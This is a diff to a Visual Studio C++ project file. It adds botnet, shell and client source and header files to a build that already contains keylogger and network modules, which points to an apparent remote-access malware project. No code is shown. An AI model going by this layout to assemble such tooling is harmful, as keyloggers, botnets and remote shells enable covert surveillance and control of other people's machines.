@@ -133,13 +133,19 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="Botnet.cpp" />
+    <ClCompile Include="ConsoleClient.h" />
     <ClCompile Include="Main.cpp" />
     <ClCompile Include="Network.cpp" />
     <ClCompile Include="KeyLogger.cpp" />
+    <ClCompile Include="Shell.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="Botnet.h" />
+    <ClInclude Include="IClient.h" />
     <ClInclude Include="Network.h" />
     <ClInclude Include="KeyLogger.h" />
+    <ClInclude Include="Shell.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
